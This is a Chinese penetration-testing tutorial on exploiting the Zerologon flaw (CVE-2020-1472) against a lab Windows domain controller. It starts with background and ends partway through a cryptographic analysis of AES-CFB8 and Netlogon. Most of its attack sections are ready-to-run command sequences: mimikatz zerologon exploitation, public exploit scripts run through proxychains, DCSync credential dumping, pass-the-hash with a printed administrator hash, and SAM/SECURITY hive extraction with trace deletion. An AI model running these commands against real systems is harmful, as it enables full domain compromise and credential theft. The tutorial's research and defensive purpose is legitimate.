@@ -1,0 +1,980 @@
+## 系列文章
+
+> [专辑：渗透测试之地基篇](https://www.freebuf.com/column/1998)
+
+## 简介
+
+ **渗透测试-地基篇**
+
+该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。
+
+ **请注意** ：
+
+> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
+> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。
+
+名言：
+
+你对这行的兴趣，决定你在这行的成就！
+
+## 一、CVE-2020-1472背景
+
+### 1、微软公布
+
+2020年08月11日，Windows官方发布了 NetLogon
+特权提升漏洞的风险通告，该漏洞编号为CVE-2020-1472，漏洞等级：严重，漏洞评分：10分。  
+![1651759749_6273da8571577bcf81c7b.png!small?1651759750361](https://image.3001.net/images/20220505/1651759749_6273da8571577bcf81c7b.png!small?1651759750361)
+
+    
+    
+    可参考微软公布详情：
+    https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472
+    
+
+### 2、全球CVE公布
+
+    
+    
+    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1472
+    
+
+![1651759770_6273da9a3f6b05fb0153a.png!small?1651759773342](https://image.3001.net/images/20220505/1651759770_6273da9a3f6b05fb0153a.png!small?1651759773342)  
+当攻击者使用 Netlogon 远程协议 (MS-NRPC) 建立与域控制器的易受攻击的 Netlogon
+安全通道连接时，就会存在特权提升漏洞，即“Netlogon 特权提升漏洞”。
+
+### 3、CVE-2020-1472-EXP诞生
+
+2020年8月11号，微软修复了Netlogon特权提升漏洞，2020年9月11日，Secura高级安全专家Tom Tervoort和技术总监Ralph
+Moonen于2020年9月
+11日发表的博文和白皮书，阐明了漏洞细节，之后相关的EXP也就被构造出来。该漏洞也称为“Zerologon”，CVSS评分为10.0，号称3秒撸域控，危害严重。攻击者在通过NetLogon（MS-NRPC）协议与AD域控建立安全通道时，可利用该漏洞将AD域控的计算机账号密码置为空，从而控制域控服务器。  
+![1651759775_6273da9f1f6fc44f2cbe9.png!small?1651759782628](https://image.3001.net/images/20220505/1651759775_6273da9f1f6fc44f2cbe9.png!small?1651759782628)
+
+ **参考文章：**
+
+    
+    
+    https://www.secura.com/blog/zero-logon
+    
+
+### 4、原理背景
+
+随着微软的公布到Secura高级安全专家公布的漏洞细节，很多的exp蜂拥而出后，接下来详细介绍下该漏洞的Netlogon原理背景。
+
+Netlogon远程协议是远程过程调用 (RPC) 协议，它在Windows网络上执行与Active
+Directory身份验证相关的各种功能。例如，它可用于重置机器密码或备份域控制器的用户数据库。然而，最常见的应用是通过NTLM协议促进远程登录。
+
+NTLM协议的目的是允许域用户登录到网络中的远程系统，例如提供文件共享的服务器或Intranet网站。虽然自Windows
+2000推出以来该协议已被Kerberos取代，但它仍然被广泛使用和支持。默认情况下，几乎所有支持Kerberos身份验证的Windows服务也允许客户端使用NTLM登录。
+
+当某人成功通过Windows域的身份验证时，会计算其密码的MD4哈希（也称为“NTLM
+哈希”）。域控制器还存储所有用户密码的MD4哈希值。当客户端随后想要使用NTLM对服务进行身份验证时，该服务将向客户端发送随机咨询。为了证明用户的身份，客户端将使用加密MAC（消息验证码）进行响应，该MAC使用用户的密码哈希作为密钥在咨询上计算得出。
+
+当有问题的服务不在域控制器本身上运行时，它实际上无法访问密码哈希，因此无法验证MAC是否正确。在这种情况下，运行该服务的系统将与域控制器建立连接，并向其发送咨询以及从客户端收到的响应。域控制器将验证MAC，并通知服务它是否有效。如果不是，那可能意味着用户输入了错误的密码。但是，如果身份验证成功，域控制器还将通知服务用户属于哪些组，并为其提供秘密会话密钥。运行服务的机器和域控制器之间的这种信息交换利用了Netlogon远程协议。  
+![1651759783_6273daa752ece9442746a.png!small?1651759783895](https://image.3001.net/images/20220505/1651759783_6273daa752ece9442746a.png!small?1651759783895)  
+该图是NTLM身份验证协议的正常运行流程和服务器与DC之间的连接使用Netlogon协议。
+
+### 5、影响范围
+
+影响版本号：
+
+    
+    
+    Windows Server 2008 R2 for x64-based Systems Service Pack 1
+    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
+    Windows Server 2012
+    Windows Server 2012 (Server Core installation)
+    Windows Server 2012 R2
+    Windows Server 2012 R2 (Server Core installation)
+    Windows Server 2016
+    Windows Server 2016 (Server Core installation)
+    Windows Server 2019
+    Windows Server 2019 (Server Core installation)
+    Windows Server, version 1903 (Server Core installation)
+    Windows Server, version 1909 (Server Core installation)
+    Windows Server, version 2004 (Server Core installation)
+    
+
+接下来将利用windows Server 2016进行实验复现演示，并分析底层原理！  
+本文将从“Zerologon”漏洞背景、前期漏洞利用条件、详解域控机器用户、CVE-2020-1472三种攻击方法、漏洞分析、常见问题解析、深度挖掘问题分析、安全防护等十个维度对该漏洞进行分析。
+
+## 二、前期漏洞利用条件
+
+![1651759789_6273daad31989b7138b56.png!small?1651759790123](https://image.3001.net/images/20220505/1651759789_6273daad31989b7138b56.png!small?1651759790123)  
+该图是简单的攻击网络拓扑图，当通过公网服务获得子域普通用户（web服务器）权限进入内网后，首先就是快速定位到域控所在的位置！
+
+### 1、确认域环境
+
+进入边界服务器后最简单查看域环境的方法：
+
+    
+    
+    ipconfig /all
+    
+
+![1651759794_6273dab22a4272a8a07da.png!small?1651759794846](https://image.3001.net/images/20220505/1651759794_6273dab22a4272a8a07da.png!small?1651759794846)  
+查看到当前服务器计算机用户名为user，DNS也就是域名为xiyou.dayu.com，说明该环境为域环境并确认域控的域名！
+
+### 2、定位域控
+
+接下来需要利用CVE-2020-1472进攻域控制器需要知道域控制器的计算机用户名等情况：
+
+    
+    
+    Nltest /dclist:域名
+    Nltest /dclist:xiyou.dayu.com
+    
+
+![1651759800_6273dab887b89f8933ebd.png!small?1651759800683](https://image.3001.net/images/20220505/1651759800_6273dab887b89f8933ebd.png!small?1651759800683)  
+可看到子域控制器的计算机名为：xiyou
+
+## 三、域控机器用户
+
+### 1、域机器用户类型
+
+这里利用CVE-2020-1472来重置域控密码。注意这里是域控密码，不是域管的密码。是域控这个机器用户的密码（例如：`XIYOU$`）。可能对域不是很熟悉的人对这点不是很了解。在域内，机器用户跟域用户一样，是域内的成员，他在域内的用户名类型是：`机器用户+$(如DC2016$)`，在本地的用户名是SYSTEM。
+
+可以通过mimikatz就可以看到机器用户的密码：
+
+administrator=域管  
+管理员用户=administrator
+
+域机器用户=计算机名+$  
+本地的用户名=SYSTEM
+
+    
+    
+    privilege::debug
+    sekurlsa::logonPasswords
+    
+
+![1651759806_6273dabeb771e4a76b27b.png!small?1651759807104](https://image.3001.net/images/20220505/1651759806_6273dabeb771e4a76b27b.png!small?1651759807104)  
+当前机器用户hash为：
+
+    
+    
+    6a92c6f57759956f320f2d4747a1e346
+    
+
+### 2、域机器用户机制
+
+机器用户也是有密码的，只不过这个密码我们经常忽视，他是随机生成的，密码强度是120个字符，高到无法爆破，而且会定时更新。
+
+在注册表：
+
+    
+    
+    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange
+    
+
+![1651759812_6273dac4d02ec0ca79367.png!small?1651759815326](https://image.3001.net/images/20220505/1651759812_6273dac4d02ec0ca79367.png!small?1651759815326)  
+决定机器用户是否定时更新密码，默认是0，定时更新MaximumPasswordAge决定机器用户更新的时间，默认是30天。
+
+## 四、Mimikatz重置域控攻击（方法一）
+
+Mimikatz 是法国人 benjamin 开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取
+WindowsXP-2012（2016
+做了安全防护，需要修改注册表值，重启后生效，可以获取明文密码）等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具，从早期 1.0 版本到现在的
+2.1.1 20180205 版本，其功能得到了很大的提升和扩展。
+
+在爆发出CVE-2020-1472漏洞后，mimikatz在20200918版本后快速更新了zerologon模块，并支持通过zerologon漏洞攻击域控服务器。
+
+### 1、 检测是否存在CVE-2020-1472漏洞
+
+这一步会利用mimikatz的zerologon模块去探测域控XIYOU是否存在该漏洞：
+
+    
+    
+    lsadump::zerologon /target:10.10.3.6 /account:XIYOU$
+    
+
+![1651759818_6273daca75e6a1c61ffca.png!small?1651759818866](https://image.3001.net/images/20220505/1651759818_6273daca75e6a1c61ffca.png!small?1651759818866)  
+显示OK，Vulnerable存在该漏洞，接下来进行利用!
+
+### 2、利用置零修改域控密码为空
+
+这一步会把域控XIYOU(即XIYOU$用户)的密码置为空，即hash为31d6cfe0d16ae931b73c59d7e0c089c0：
+
+    
+    
+    lsadump::zerologon /target:10.10.3.6 /account:XIYOU$ /exploit
+    
+
+![1651759824_6273dad052f35162ae419.png!small?1651759825052](https://image.3001.net/images/20220505/1651759824_6273dad052f35162ae419.png!small?1651759825052)  
+回显两个OK显示成功，密码成功置零！接下来使用空密码就可以进行Dcsync，这里有个疑问为什么不能直接登录该用户到系统就能完美控制了？在拥有域控的机器用户密码的情况下，并不能直接使用该密码登录域控，因为机器用户是不可以登录的，但是因为域控的机器用户具备Dcsync特权，我们就可以滥用该特权来进行Dcsync。**Dcsync是什么？**留着后面进行漏洞分析环境详细解析！
+
+### 3、Dcsync获取域控hash
+
+这里面可以使用impacket套件里面的secretsdump来进行Dcsync，利用代理安装impacket，然后按照我的命令步骤安装环境即可，最新版2021kali是存在该impacket的，老版本不存在需要手动自行安装环境:
+
+    
+    
+    proxychains git clone https://github.com/SecureAuthCorp/impacket.git
+    cd impacket/
+    sudo pip3 install .
+    sudo python3 setup.py install
+    
+    pip3安装：
+    wget https://bootstrap.pypa.io/get-pip.py
+    python3 get-pip.py
+    
+
+按照该方法安装完成后：
+
+    
+    
+    proxychains impacket-secretsdump -no-pass -just-dc xiyou.dayu.com/XIYOU\$@10.10.3.6
+    
+    -no-pass  ---不询问密码
+    -just-dc  ---仅提取NTDS.DIT​数据（NTLM哈希和Kerberos密钥）
+    域名+计算机名+IP
+    
+
+![1651759833_6273dad97f7982ee9fff6.png!small?1651759851378](https://image.3001.net/images/20220505/1651759833_6273dad97f7982ee9fff6.png!small?1651759851378)  
+通过前面的impacket环境安装，直接利用通过-no-pass空值登录对方dc，获得dayu的子域控制器的所有用户hash！这里会引出Dcsync是什么？Hash是什么？域机器用户密码值置空后会产生什么影响？在漏洞分析中揭晓！
+
+### 4、PTH横向
+
+利用获取的域管凭证进行hash注入获取一个域管权限的cmd.exe。这里的“domain:.”也可以是“domain:dayu”
+
+    
+    
+    administrator的hash：
+    42e2656ec24331269f82160ff5962387
+    
+    privilege::debug
+    sekurlsa::pth /user:Administrator /domain:. /ntlm:42e2656ec24331269f82160ff5962387
+    
+
+![1651759839_6273dadfd949a4ba87f1d.png!small?1651759848484](https://image.3001.net/images/20220505/1651759839_6273dadfd949a4ba87f1d.png!small?1651759848484)  
+可看到成功通过子域普通任意用户名横向攻击登录到子域控制器内！并且通过复制文件测试是否能横向攻击，那么接下来直接利用计划任务调用复制过去的恶意程序即可直接上线！
+
+### 5、恢复脱域的域控（方法1）
+
+在攻击过程中，我们将机器的密码置为空，这一步是会导致域控脱域的，具体原因后面会分析。其本质原因是由于机器用户在AD中的密码（存储在ntds.dit中）与本地的注册表/lsass里面的密码不一致导致的。所以要将其恢复，我们将AD中的密码与注册表/lsass里面的密码保持一致就行。这里主要有三种方法：
+
+    
+    
+    1. 从注册表/lsass里面读取机器用户原先的密码，恢复AD里面的密码
+    2. 使用mimikatz的sekurlsa::logonpassword从lsass里面进行抓取或者使用脚本抓取，然后使用脚本修改恢复
+    3. 使用mimikatz的postzerologon模块强制暴力修改恢复
+    
+
+这里直接使用mimikatz强制暴力修改恢复，在新开的cmd中使用mimikatz修改域控密码。mimikatz会将保存在域中的凭证以及注册表/lsass中的凭证同时修改为"Waza1234/Waza1234/Waza1234/"，这样不影响域控的正常工作。
+
+    
+    
+    privilege::debug
+    lsadump::postzerologon /target:10.10.3.6 /account:XIYOU$
+    
+
+![1651759846_6273dae6766a69d057b14.png!small?1651759852086](https://image.3001.net/images/20220505/1651759846_6273dae6766a69d057b14.png!small?1651759852086)  
+成功将空值修改为Waza1234/Waza1234/Waza1234/，这样新加入的域控生产环境就可以继续运行工作了，验证方法可以再次使用impacket环境，利用通过-no-pass空值登录对方dc，如果不成功无法登录就已重置！
+
+## 五、Zerologon-EXP（方法二）
+
+第一种方法限制条件很多，mimikatz需要在子域普通用户上进行操作，且mimikatz需要免杀才可以进行操作，那么第二种方法是在不接触对方系统情况下，利用socks5隧道使用zerologon进行置零攻击行为！
+
+### 1、重置攻击利用
+
+下载地址：
+
+    
+    
+    https://github.com/De4dCr0w/Vulnerability-analyze
+    
+
+![1651759851_6273daeb6c8d753a00778.png!small?1651759852086](https://image.3001.net/images/20220505/1651759851_6273daeb6c8d753a00778.png!small?1651759852086)
+
+### 2、验证漏洞
+
+1）测试是否存在漏洞：
+
+    
+    
+    cd /root/Desktop/test12/Vulnerability-analyze/Zerologon-CVE-2020-1472
+    
+    proxychains python3 zerologon_tester.py XIYOU 10.10.3.6
+    
+
+![1651759856_6273daf0a9ea5bd393053.png!small?1651759863656](https://image.3001.net/images/20220505/1651759856_6273daf0a9ea5bd393053.png!small?1651759863656)  
+通过FRP隧道代理的socks5隧道进行连接攻击，成功检测对方域控存在置零漏洞。
+
+2）windows版本EXP验证漏洞
+
+或者在windows环境下执行：需要python3.8以上环境，开启代理执行！
+
+下载地址：
+
+    
+    
+    https://github.com/picussecurity/picuslabs/blob/master/CVE-2020-1472%20Zerologon/zerologon_tester.zip
+    
+
+检测漏洞是否存在：  
+需要windows存在python3.8环境或以上环境！开启代理！
+
+    
+    
+    .\zerologon_tester.exe XIYOU 10.10.3.6
+    
+
+![1651759864_6273daf8c414bebdae877.png!small?1651759867955](https://image.3001.net/images/20220505/1651759864_6273daf8c414bebdae877.png!small?1651759867955)  
+可看到漏洞存在！
+
+### 3、置零哈希攻击
+
+1）执行命令：
+
+    
+    
+    proxychains python3 CVE-2020-1472.py XIYOU XIYOU$ 10.10.3.6
+    
+
+![1651759872_6273db003c9956e2fbc23.png!small?1651759880567](https://image.3001.net/images/20220505/1651759872_6273db003c9956e2fbc23.png!small?1651759880567)![1651759876_6273db04b941e414e55fb.png!small?1651759880567](https://image.3001.net/images/20220505/1651759876_6273db04b941e414e55fb.png!small?1651759880567)  
+通过回显可查看到成功置零攻击，验证！
+
+### 4、Dcsync获取域控hash
+
+域控凭证通过dcsync获取域管机器用户的hash：
+
+    
+    
+    proxychains impacket-secretsdump -no-pass -just-dc xiyou.dayu.com/XIYOU\$@10.10.3.6
+    
+
+![1651759882_6273db0a4e94fd4487323.png!small?1651759894651](https://image.3001.net/images/20220505/1651759882_6273db0a4e94fd4487323.png!small?1651759894651)  
+通过前面的impacket环境安装，直接利用通过-no-pass空值登录对方dc，获得dayu的子域控制器的所有用户hash！
+
+### 5、恢复脱域的域控（方法2）
+
+通过第一种方法知道是强制修改对方置零空值后的密码，那么第二种方法教给大家是进行原密码还原！接下来利用wmiexec去读取域控SAM密码存储配置信息！
+
+wmiexec是对windows自带的wmic做了一些强化，让渗透变得更容易。 只能说很多工具吧，比较好用的在这里介绍几种。
+wmiexec需要提供账号密码进行远程连接，但是如果没有破解出账号和明文密码，也可以配合哈希传递或票据注入功能一起使用，先进行传递或注入，然后再使用WMIEXEC即可。
+
+    
+    
+    proxychains wmiexec.py -hashes :c515ba5a374ae93dd2018cab7edfb42d ./Administrator@10.10.3.6
+    
+    reg save HKLM\SYSTEM system.save
+    reg save HKLM\SAM sam.save
+    reg save HKLM\SECURITY security.save
+    get system.save
+    get sam.save
+    get security.save
+    del /f system.save
+    del /f sam.save
+    del /f security.save
+    
+
+![1651759889_6273db11a99347d91028f.png!small?1651759894651](https://image.3001.net/images/20220505/1651759889_6273db11a99347d91028f.png!small?1651759894651)  
+通过wmiexec横向登录对方administrator系统后，通过reg调出底层的sam包，sam包里面包含了所有的散列值，通过get将sam包下载到本地kali上，在清理痕迹！
+
+### 6、读取SAM文件hash
+
+使用impacket中的secretsdump拿到域控机器账户原始哈希：
+
+    
+    
+    impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
+    
+
+![1651759895_6273db1720847ea8dc486.png!small?1651759911748](https://image.3001.net/images/20220505/1651759895_6273db1720847ea8dc486.png!small?1651759911748)  
+通过查看SAM文件中存储的HASH值，获取到域控机器用户的哈希！然后进行替换即可！为什么选择$MACHINE.ACC:之后的hash值认定为计算机用户的哈希？在漏洞分析解答！
+
+### 7、哈希恢复
+
+将域机器用户密码恢复：
+
+    
+    
+    https://github.com/risksense/zerologon
+    
+    proxychains python3 reinstall_original_pw.py XIYOU 10.10.3.6 f5369b5accc878d9eedfcde13578e2fc
+    
+
+![1651759901_6273db1d37ac3c683b36d.png!small?1651759918233](https://image.3001.net/images/20220505/1651759901_6273db1d37ac3c683b36d.png!small?1651759918233)![1651759905_6273db21dd26a5272cd4b.png!small?1651759918233](https://image.3001.net/images/20220505/1651759905_6273db21dd26a5272cd4b.png!small?1651759918233)
+
+    
+    
+    Success! DC machine account should be restored to it's original value. You might want to secretsdump again to check.
+    
+
+成功！域机器用户恢复为其原始值密码值，验证！
+
+### 8、验证是否重置哈希
+
+    
+    
+    proxychains impacket-secretsdump -no-pass -just-dc xiyou.dayu.com/XIYOU\$@10.10.3.6
+    
+
+![1651759912_6273db280b764530268c1.png!small?1651759918234](https://image.3001.net/images/20220505/1651759912_6273db280b764530268c1.png!small?1651759918234)  
+经过测试，执行1~2次，就无法利用空hash获取了！
+
+## 六、zerologon-EXP（方法三）
+
+通过方法二知晓了通过外网socks5代理也是可以进行置零域控攻击的，方法三的脚本有很多相同点，但是也有不同点，在方法二中恢复脱产域控的域机器用户hash是通过`$MACHINE.ACC:`进行恢复，方法三是通过`$MACHINE.ACC:plain_password_hex:`进行恢复！
+
+### 1、环境安装
+
+第三种方法是国内大佬写的，这边我还是推出来，也是很不错的方法，技多不压身！安装方法：
+
+    
+    
+    proxychains git clone https://github.com/SecureAuthCorp/impacket.git
+    cd impacket/
+    sudo pip3 install .
+    sudo python3 setup.py install
+    
+    pip3安装：
+    wget https://bootstrap.pypa.io/get-pip.py
+    python3 get-pip.py
+    
+
+需要安装pip3环境，跟着命令安装即可！完成安装后开始验证漏洞！
+
+### 2、验证漏洞
+
+使用zerologon_tester.py，验证是否存在漏洞，下载地址：
+
+    
+    
+    https://github.com/SecuraBV/CVE-2020-1472
+    pip install -r requirements.txt
+    
+    proxychains python3 zerologon_tester.py XIYOU 10.10.3.6
+    
+
+![1651759920_6273db300eb5e8023cf1e.png!small?1651759948805](https://image.3001.net/images/20220505/1651759920_6273db300eb5e8023cf1e.png!small?1651759948805)  
+验证漏洞存在！
+
+### 3、置零哈希
+
+使用cve-2020-1472-exploit.py将机器账户重置  
+下载地址：
+
+    
+    
+    https://github.com/VoidSec/CVE-2020-1472
+    git clone https://github.com/VoidSec/CVE-2020-1472.git
+    
+    proxychains python3 cve-2020-1472-exploit.py -n XIYOU$ -t 10.10.3.6
+    
+
+![1651759926_6273db3663593819ab314.png!small?1651759971984](https://image.3001.net/images/20220505/1651759926_6273db3663593819ab314.png!small?1651759971984)  
+选择Y后执行置零攻击，回显可看成功!
+
+### 4、Dcsync获取域控hash
+
+域控的机器账户可以使用DCSync导出域内所有用户凭据：
+
+    
+    
+    proxychains impacket-secretsdump -no-pass -just-dc xiyou.dayu.com/XIYOU\$@10.10.3.6
+    
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:c515ba5a374ae93dd2018cab7edfb42d:::
+    .....
+    
+
+可看到域控的所有hash都获取到了！
+
+### 5、恢复脱域的域控
+
+恢复xiyou$域机器账户的密码通过，然后通过wmiexec，pass the hash拿到域控制器中的本地管理员权限(域管)，这里和第二种方法一样！
+
+    
+    
+    proxychains python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387 xiyou.dayu.com/Administrator@10.10.3.6
+    
+
+![1651759941_6273db4589f6f1e338b6a.png!small?1651759988029](https://image.3001.net/images/20220505/1651759941_6273db4589f6f1e338b6a.png!small?1651759988029)  
+然后分别执行，拷贝本机中SAM数据库到本地端：
+
+    
+    
+    reg save HKLM\SYSTEM system.save
+    reg save HKLM\SAM sam.save
+    reg save HKLM\SECURITY security.save
+    get system.save
+    get sam.save
+    get security.save
+    del /f system.save
+    del /f sam.save
+    del /f security.save
+    
+
+  
+成功提取域SAM存储hash文件！
+
+### 6、读取SAM文件hash
+
+提取出机器账号的明文hex：
+
+    
+    
+    proxychains impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
+    
+
+  
+成功获得hex原哈希值！
+
+### 7、哈希恢复
+
+这里需要注意是XIYOU@XIYOU：
+
+    
+    
+    proxychains python3 restorepassword.py XIYOU@XIYOU -target-ip 10.10.3.6 -hexpass 570061007a00610031003200330034002f00570061007a00610031003200330034002f00570061007a00610031003200330034002f00
+    
+
+![1651759958_6273db56c3f65fd9e7c0d.png!small?1651760006669](https://image.3001.net/images/20220505/1651759958_6273db56c3f65fd9e7c0d.png!small?1651760006669)  
+可以看到信息完整哈希恢复了！
+
+### 8、验证是否重置哈希
+
+    
+    
+    proxychains impacket-secretsdump -no-pass -just-dc xiyou.dayu.com/XIYOU\$@10.10.3.6
+    
+
+  
+经过测试，执行1~2次，就无法利用空hash获取了！
+
+## 七、漏洞分析
+
+通过三种方法在自己搭建的域环境中复现了该漏洞情况，也遗留了很多问题需要探索和了解，接下来将尽可能带大家深度研究挖掘探索到CVE-2020-1472漏洞情况！
+
+### 1、Netlogon解析
+
+ **1）Netlogon是什么？**
+
+Netlogon，是服务为域控制器注册所有的srv（）资源纪录的一种程序。Netlogon服务为域控制器注册所有的srv资源记录。
+这些记录出现在DNS服务器的正向查询区域你的域名中的_msdcs，_sites，_tcp，and
+_udp等文件夹中。其他计算机利用这些记录查询域活动目录相关的信息。
+
+    
+    
+    SRV记录（英语：Service Record，中文又名服务定位记录）是域名系统中用于指定服务器提供服务的位置（如主机名和端口）数据
+    
+
+**2）Netlogon用途**
+
+Netlogon是Windows
+Server进程，用于对域中的用户和其他服务进行身份验证。由于Netlogon是服务而不是应用程序，因此除非手动或由于运行时错误而停止，否则Netlogon会在后台连续运行。Netlogon可以从命令行终端停止或重新启动。其他机器与域控的netlogon通讯使用RPC协议MS-NRPC。
+
+MS-NRPC指定了Netlogon远程协议，主要功能有基于域的网络上的用户和计算机身份验证；为早于Windows
+2000备份域控制器的操作系统复制用户帐户数据库；维护从域成员到域控制器，域的域控制器之间以及跨域的域控制器之间的域关系；并发现和管理这些关系。
+
+我们在MS-NRPC的文档里面可以看到为了维护这些功能所提供的RPC函数。机器用户访问这些RPC函数之前会利用本身的hash进行校验，
+**这次的问题就出现在认证协议的校验上。**
+
+### 2、IV全为0导致的AES_CFB8安全问题
+
+来看下AES_CFB8算法的一个安全问题，首先说下CFB模式的加解密，在CFB模式中，前一个密文分组会被送回到密码算法的输入端。所谓反馈，这里指的就是返回输入端的意思：  
+![1651759970_6273db62310fa4281dcfc.png!small?1651759988028](https://image.3001.net/images/20220505/1651759970_6273db62310fa4281dcfc.png!small?1651759988028)  
+CFB是一种分组密码，可以将块密码变为自同步的流密码。  
+ **CFB模式的优点：**
+
+    
+    
+    1. 隐藏了明文模式
+    2. 分组密码转化为流模式
+    3. 可以及时加密传送小于分组的数据
+    
+
+**CFB模式的缺点：**
+
+    
+    
+    1. 不利于并行计算
+    2. 误差传送：一个明文单元损坏影响多个单元
+    3. 唯一的IV
+    
+
+对CFB模式的攻击，截图来源自图解密码技术一书：  
+![1651759978_6273db6a2f5ce11861288.png!small?1651760010824](https://image.3001.net/images/20220505/1651759978_6273db6a2f5ce11861288.png!small?1651760010824)  
+![1651759982_6273db6e7fc1e78e7f95f.png!small?1651760010824](https://image.3001.net/images/20220505/1651759982_6273db6e7fc1e78e7f95f.png!small?1651760010824)  
+其加解密公式如下：  
+![1651759986_6273db725cb0ad7ad8986.png!small?1651760010825](https://image.3001.net/images/20220505/1651759986_6273db725cb0ad7ad8986.png!small?1651760010825)  
+既将明文拆分为N份，C1，C2，C3！每一轮的密文的计算是，先将上一轮的密文进行加密(在AES_CFB里面是使用AES进行加密)，然后异或明文，得到新一轮的密文。
+
+这里需要用到上一轮的密文，由于第一轮没有上一轮。所以就需要一个初始向量参与运算，这个初始向量我们称为：IV，下面用一张图来具体讲解下：  
+![1651759990_6273db7648655d6bc8e0a.png!small?1651760014785](https://image.3001.net/images/20220505/1651759990_6273db7648655d6bc8e0a.png!small?1651760014785)  
+这里的IV是fab3c65326caafb0cacb21c3f8c19f68！明文是0102030405060708！第一轮之上没有上一轮，需要IV参与运算。那么第一轮的运算就是：  
+![1651759994_6273db7a2e78be33e64fa.png!small?1651760014784](https://image.3001.net/images/20220505/1651759994_6273db7a2e78be33e64fa.png!small?1651760014784)
+
+    
+    
+    E(fab3c65326caafb0cacb21c3f8c19f68) = e2xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+    
+
+然后e2与明文01异得到密文e3，第二轮的密文计算是，先将第一轮的密文进行AES加密，然后异或明文，密文。
+
+第一轮的密文就是(没有fa了)：
+
+    
+    
+    b3c65326caafb0cacb21c3f8c19f68+e2=b3c65326caafb0cacb21c3f8c19f68e2
+    
+    E(b3c65326caafb0cacb21c3f8c19f68e2=9axxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+    
+
+然后91与明文异或得到密文98！那么为什么E(fab3c65326caafb0cacb21c3f8c19f68)=`e2xxxxxxxxxxxxxxxxxxxxxxxxxxxxx？？AES
+key值不一定，计算的结果也不一定，这里是假设刚好存在某个key使得这个结果成立：  
+![1651759999_6273db7fb1015d3a385f6.png!small?1651760014784](https://image.3001.net/images/20220505/1651759999_6273db7fb1015d3a385f6.png!small?1651760014784)  
+所以最后就是明文是0102030405060708经过八轮运算之后得到：
+
+    
+    
+    e39855xxxxxxxxxxxxxxxxxxxxxxxxx
+    
+
+每一轮计算的值是8位，既0x01,0x02。(每个16进制数4位)，因为是AES_CFB8计算！而每轮AES运算的是128位(既16字节)，因为这里是AES128！
+
+我们观察每轮参与AES运算的上一轮密文：  
+![1651760006_6273db8607d44b9e89aab.png!small?1651760040386](https://image.3001.net/images/20220505/1651760006_6273db8607d44b9e89aab.png!small?1651760040386)  
+第一轮是：fab3c65326caafb0cacb21c3f8c19f68。第二轮的时候是往后移八位，既减去fa得到b3c65326caafb0cacb21c3f8c19f68，再加上第一轮加密后的密码e3得到b3c65326caafb0cacb21c3f8c19f68。
+
+这个时候我们考虑一种极端的情况，当IV为8个字节的0的时候，既IV=000000000000000000000000000000，那么新的运算就变成：  
+![1651760010_6273db8a0835ad81e5968.png!small?1651760040386](https://image.3001.net/images/20220505/1651760010_6273db8a0835ad81e5968.png!small?1651760040386)  
+可以看到参与AES运算的上一轮密文的值是不断减去最前面的00，不断加入密文！只要key固定，那么E(X)的值一定是固定的。那么是不是在key固定的情况下，只要我保证参与AES运算的上一轮密文是固定的，那么E(参与AES运算的上一轮密文)一定是固定的。
+
+参与AES运算的上一轮密文每轮是怎么变化的：
+
+    
+    
+    000000000000000000000000000000 -> 0000000000000000000000000000a4 -> 00000000000000000000000000a489
+    
+
+前面的00不断减少，后面不断加进密文！那么是不是只需要保证不断加进来的值是00，参与AES运算的上一轮密文就一直是000000000000000000000000000000。也就是说现在只要保证每一轮加密后的密文是00，那么整个表格就不会变化。最后得到的密文就是000000000000000000000000000000。
+
+要保证每一轮加密后的密文是00，只需要每一轮的明文内容和E(参与AES运算的上一轮密文)的前面8位一样就行。(两个一样的数异或为0)，我们来看下这个表格：  
+![1651760016_6273db90459ef427f0730.png!small?1651760040387](https://image.3001.net/images/20220505/1651760016_6273db90459ef427f0730.png!small?1651760040387)
+
+由于在key固定的情况下，E(000000000000000000000000000000)的值固定，所以E(参与AES运算的上一轮密文)的前面8位是固定的，而每一轮的明文内容和E(参与AES运算的上一轮密文)的前面前面8位一样。所以每一轮的明文内容就必须要一样。所以要求明文的格式就是XYXYXYXYXYXYXY这种格式。那么还剩下最后一个问题。假设我们可以控制明文，那么在不知道key的情况下，我们怎么保证E(000000000000000000000000000000)的前面8位一定和明文一样呢？
+
+可以用随机性2000去测试，前面八位的可能性有2**8=256(00-FF)，因为每一位都可能是0或者1。那么也就是说我们运行一次，在不知道key的情况下，E(000000000000000000000000000000)的前面8位一定和明文一样的概率是1/256，我们可以通过不断的增加尝试次数，运行到2000次的时候，至少有一次命中的概率已经有99.6%了。(具体怎么算。文章后面会介绍)。
+
+ **所以我们最后下一个结论：**  
+在AES_CFB8算法中，如果IV为全零。只要我们能控制明文内容为XYXYXYXY这种格式(X和Y可以一样，既每个字节的值都是一样的)，那么一定存在一个key，使得AES_CFB8(XYXYXYXY)=00000000。
+
+### 3、netlogon 认证协议绕过
+
+说完IV全为0导致的AES_CFB8安全问题，我们来看看netlogon认证协议：  
+![1651760028_6273db9ce8f0876a61fa9.png!small?1651760060350](https://image.3001.net/images/20220505/1651760028_6273db9ce8f0876a61fa9.png!small?1651760060350)
+
+    
+    
+    1）首先由客户端发起挑战，传送Client challenge（调用NetrServerReqChallenge）
+    2）服务端响应Server challenge
+    3）双方都使用共享的密钥以及来自双方的 challenges 进行计算得到 SessionKey，这样双方就拥有了相同的 SessionKey 以及 Client challenge 和 Server challenge。
+    4）客户端使用 SessionKey 作为密钥加密 Client challenge 得到 Client credential 并发送给服务端，服务端也采用相同的方法计算出一个 Client credential，比较这两者是否相同，如果相同，则客户端身份认证成功
